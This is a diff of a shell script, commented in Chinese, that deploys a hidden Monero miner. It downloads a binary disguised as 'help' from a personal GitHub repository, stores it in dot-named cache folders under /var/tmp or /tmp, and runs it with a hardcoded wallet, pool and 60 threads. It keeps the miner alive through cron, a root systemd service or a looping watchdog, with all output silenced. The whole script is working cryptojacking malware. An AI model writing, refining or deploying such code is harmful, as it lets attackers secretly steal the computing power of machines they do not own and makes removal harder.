@@ -12,8 +12,8 @@ if [ "${1:-}" = "debug" ]; then
 fi
 
 ### 配置区（修改这里） ###
-REPO_URL="https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz"
-BIN_NAME="xmrig"
+REPO_URL="https://github.com/dadashabi123/shabi/raw/refs/heads/main/help"
+BIN_NAME="help"
 WALLET="43CcvodQDNGQnDyPY2adzKcgbmKzncFt1dtCDGUnJAKcQAmaVr3KQ5WhVsw2e8DYQcCbd16PbBhEWPk2GV3xrtoaH3kCrUE"
 POOL="pool.supportxmr.com:3333"
 THREADS="60"
@@ -27,35 +27,82 @@ debug_echo() {
     fi
 }
 
+### 检查用户权限 ###
+check_user_privileges() {
+    debug_echo "检查用户权限"
+    
+    # 检查是否为root用户
+    if [ "$(id -u)" -eq 0 ]; then
+        echo "[+] 检测到root权限"
+        USER_TYPE="root"
+        return 0
+    fi
+    
+    # 检查是否为可登录用户
+    if [ -d "/home/$(whoami)" ] || [ -d "/home/$(id -un)" ]; then
+        echo "[+] 检测到可登录用户"
+        USER_TYPE="login"
+        return 0
+    fi
+    
+    # 检查是否为系统用户
+    if id -u "$(whoami)" >/dev/null 2>&1; then
+        echo "[+] 检测到系统用户"
+        USER_TYPE="system"
+        return 0
+    fi
+    
+    echo "[-] 未知用户类型"
+    return 1
+}
+
+### 根据用户类型选择存储目录 ###
+select_storage_dir() {
+    debug_echo "选择存储目录"
+    
+    case "$USER_TYPE" in
+        "root")
+            # root用户优先使用系统目录
+            for dir in "/var/lib" "/var/tmp" "/tmp"; do
+                if [ -w "$dir" ]; then
+                    STORE_DIR="$dir/.${BIN_NAME}_cache"
+                    debug_echo "Root用户选择目录: $STORE_DIR"
+                    return 0
+                fi
+            done
+            ;;
+        *)
+            # 非root用户优先使用/var/tmp
+            if [ -w "/var/tmp" ]; then
+                STORE_DIR="/var/tmp/.${BIN_NAME}_cache"
+                debug_echo "非root用户选择目录: $STORE_DIR"
+                return 0
+            fi
+            # 如果/var/tmp不可写，尝试其他目录
+            for dir in "/tmp" "$HOME" "$(pwd)"; do
+                if [ -w "$dir" ]; then
+                    STORE_DIR="$dir/.${BIN_NAME}_cache"
+                    debug_echo "使用备用目录: $STORE_DIR"
+                    return 0
+                fi
+            done
+            ;;
+    esac
+    
+    echo "[-] 无法找到可写目录"
+    return 1
+}
+
 ### 初始化环境 ###
 init_env() {
     debug_echo "开始初始化环境"
-    # 高权限用户优先使用 /var/tmp 或 /var/lib
-    if [ "$(id -u)" -eq 0 ]; then
-        for dir in "/var/tmp" "/var/lib" "/tmp"; do
-            if [ -w "$dir" ]; then
-                STORE_DIR="$dir/.${BIN_NAME}_cache"
-                debug_echo "选择存储目录: $STORE_DIR"
-                break
-            fi
-        done
-    else
-        # 低权限用户或无 home 目录的用户
-        for dir in "/tmp" "/var/tmp" "$(pwd)"; do
-            if [ -w "$dir" ]; then
-                STORE_DIR="$dir/.${BIN_NAME}_cache"
-                debug_echo "选择存储目录: $STORE_DIR"
-                break
-            fi
-        done
-    fi
-
-    # 如果所有目录都不可写，使用当前目录
-    if [ -z "${STORE_DIR:-}" ]; then
-        STORE_DIR="$(pwd)/.${BIN_NAME}_cache"
-        debug_echo "使用当前目录: $STORE_DIR"
-    fi
-
+    
+    # 检查用户权限
+    check_user_privileges || exit 1
+    
+    # 选择存储目录
+    select_storage_dir || exit 1
+    
     # 确保目录存在并可写
     mkdir -p "$STORE_DIR"
     if [ ! -w "$STORE_DIR" ]; then
@@ -64,7 +111,7 @@ init_env() {
     fi
     debug_echo "存储目录已创建并确认可写"
     
-    # 选择下载工具（优先用 curl）
+    # 选择下载工具（优先用curl）
     if command -v curl >/dev/null; then
         DOWNLOAD="curl -sSL"
         debug_echo "使用 curl 下载"
@@ -81,53 +128,19 @@ init_env() {
 deploy_bin() {
     if [ ! -f "${STORE_DIR}/${BIN_NAME}" ]; then
         echo "[*] 下载 ${BIN_NAME}..."
-        debug_echo "开始下载和解压过程"
+        debug_echo "开始下载过程"
         
-        # 创建临时目录
-        TEMP_DIR="${STORE_DIR}/temp"
-        mkdir -p "$TEMP_DIR"
-        debug_echo "创建临时目录: $TEMP_DIR"
-        
-        # 下载文件
+        # 直接下载文件
         debug_echo "下载URL: $REPO_URL"
-        $DOWNLOAD "$REPO_URL" > "${TEMP_DIR}/archive.tar.gz"
+        $DOWNLOAD "$REPO_URL" > "${STORE_DIR}/${BIN_NAME}"
         if [ $? -ne 0 ]; then
             echo "[-] 下载失败"
-            rm -rf "$TEMP_DIR"
             exit 1
         fi
         debug_echo "下载完成"
         
-        # 解压文件
-        debug_echo "开始解压"
-        tar -xzf "${TEMP_DIR}/archive.tar.gz" -C "$TEMP_DIR"
-        if [ $? -ne 0 ]; then
-            echo "[-] 解压失败"
-            rm -rf "$TEMP_DIR"
-            exit 1
-        fi
-        debug_echo "解压完成"
-        
-        # 查找二进制文件
-        debug_echo "查找二进制文件"
-        BIN_PATH=$(find "$TEMP_DIR" -name "xmrig" -type f | head -n 1)
-        if [ -z "$BIN_PATH" ]; then
-            echo "[-] 未找到二进制文件"
-            debug_echo "目录内容:"
-            ls -R "$TEMP_DIR"
-            rm -rf "$TEMP_DIR"
-            exit 1
-        fi
-        debug_echo "找到二进制文件: $BIN_PATH"
-        
-        # 移动文件
-        debug_echo "移动文件到: ${STORE_DIR}/${BIN_NAME}"
-        cp "$BIN_PATH" "${STORE_DIR}/${BIN_NAME}"
+        # 设置执行权限
         chmod +x "${STORE_DIR}/${BIN_NAME}"
-        
-        # 清理
-        debug_echo "清理临时文件"
-        rm -rf "$TEMP_DIR"
         
         if [ ! -x "${STORE_DIR}/${BIN_NAME}" ]; then
             echo "[-] 权限设置失败"
@@ -150,11 +163,11 @@ start_process() {
     fi
 }
 
-### 持久化方式检测 ###
+### 根据用户类型选择持久化方式 ###
 setup_persistence() {
     debug_echo "开始设置持久化"
-
-    # 1. 首选 Cron（通用且不需要高权限）
+    
+    # 优先尝试使用crontab（适用于所有用户类型）
     if command -v crontab >/dev/null; then
         debug_echo "使用 Cron 持久化"
         STARTUP_CMD="cd ${STORE_DIR} && nohup ${STORE_DIR}/${BIN_NAME} -o $POOL -u $WALLET --cpu-max-threads-hint $THREADS -p $WORKER_NAME --donate-level=0 -b >/dev/null 2>&1 &"
@@ -162,12 +175,15 @@ setup_persistence() {
         eval "$STARTUP_CMD" &
         return
     fi
-
-    # 2. 尝试 Systemd 服务（需要高权限）
-    if [ "$(id -u)" -eq 0 ] && command -v systemctl >/dev/null; then
-        debug_echo "使用 Systemd 持久化"
-        SERVICE_FILE="/etc/systemd/system/${BIN_NAME}.service"
-        cat > "$SERVICE_FILE" <<EOF
+    
+    # 如果crontab不可用，根据用户类型选择其他方式
+    case "$USER_TYPE" in
+        "root")
+            # root用户尝试使用systemd
+            if command -v systemctl >/dev/null; then
+                debug_echo "使用 Systemd 持久化"
+                SERVICE_FILE="/etc/systemd/system/${BIN_NAME}.service"
+                cat > "$SERVICE_FILE" <<EOF
 [Unit]
 Description=${BIN_NAME} Service
 After=network.target
@@ -180,81 +196,14 @@ User=root
 [Install]
 WantedBy=multi-user.target
 EOF
-        systemctl enable "${BIN_NAME}.service" >/dev/null 2>&1
-        systemctl start "${BIN_NAME}.service" >/dev/null 2>&1
-        return
-    fi
-
-    # 3. 尝试 /etc/init.d 脚本（需要高权限）
-    if [ "$(id -u)" -eq 0 ]; then
-        debug_echo "使用 /etc/init.d 脚本持久化"
-        INIT_SCRIPT="/etc/init.d/${BIN_NAME}"
-        cat > "$INIT_SCRIPT" <<EOF
-#!/bin/bash
-### BEGIN INIT INFO
-# Provides: ${BIN_NAME}
-# Required-Start: \$network
-# Required-Stop: \$network
-# Default-Start: 2 3 4 5
-# Default-Stop: 0 1 6
-# Short-Description: ${BIN_NAME} Service
-# Description: ${BIN_NAME} Mining Service
-### END INIT INFO
-
-# 存储目录
-STORE_DIR="${STORE_DIR}"
-BIN_NAME="${BIN_NAME}"
-POOL="${POOL}"
-WALLET="${WALLET}"
-THREADS="${THREADS}"
-WORKER_NAME="${WORKER_NAME}"
-
-# 启动命令
-START_CMD="cd \${STORE_DIR} && nohup \${STORE_DIR}/\${BIN_NAME} -o \${POOL} -u \${WALLET} --cpu-max-threads-hint \${THREADS} -p \${WORKER_NAME} --donate-level=0 -b >/dev/null 2>&1 &"
-
-case "\$1" in
-    start)
-        if ! pgrep -f "\${BIN_NAME}.*\${POOL}" >/dev/null; then
-            eval "\${START_CMD}"
-        fi
-        ;;
-    stop)
-        pkill -f "\${BIN_NAME}.*\${POOL}" >/dev/null 2>&1
-        ;;
-    restart)
-        \$0 stop
-        sleep 2
-        \$0 start
-        ;;
-    status)
-        if pgrep -f "\${BIN_NAME}.*\${POOL}" >/dev/null; then
-            exit 0
-        else
-            exit 1
-        fi
-        ;;
-    *)
-        exit 1
-        ;;
-esac
-exit 0
-EOF
-        # 设置权限
-        chmod +x "$INIT_SCRIPT"
-        
-        # 启用服务（根据系统类型选择命令）
-        if command -v update-rc.d >/dev/null; then
-            update-rc.d "${BIN_NAME}" defaults >/dev/null 2>&1
-        elif command -v chkconfig >/dev/null; then
-            chkconfig "${BIN_NAME}" on >/dev/null 2>&1
-        fi
-        
-        # 立即启动服务
-        "$INIT_SCRIPT" start
-        return
-    fi
-
-    # 4. 回退到 While 循环（最低权限）
+                systemctl enable "${BIN_NAME}.service" >/dev/null 2>&1
+                systemctl start "${BIN_NAME}.service" >/dev/null 2>&1
+                return
+            fi
+            ;;
+    esac
+    
+    # 如果上述方法都不可用，使用while循环监控
     debug_echo "使用 While 循环监控"
     monitor_func() {
         while true; do
